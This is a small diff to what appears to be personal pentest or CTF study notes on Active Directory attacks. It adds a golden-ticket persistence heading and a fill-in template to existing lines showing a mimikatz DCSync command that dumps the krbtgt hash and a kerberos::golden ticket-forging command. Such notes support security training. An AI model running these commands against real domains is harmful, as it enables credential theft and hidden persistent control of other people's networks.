@@ -452,5 +452,12 @@ Always run winPEAS:
                            
                            mimikatz----- lsadump::dcsync  /domain:spooky.local  /user:krbtgt
                            
-                           persistence:
+                           persistence:(Golden ticket)
+                           
                            kerberos::golden /domian:spooky.local /sid:xxxxxxxxxxxxxxxxxxx  /user:admin /krbtgt:nt-hash /ptt
+ 
+ 
+                           Golden-Part-2
+                           DOMAIN:
+                           DOMAIN SID:
+                           KRBTGT HASH:
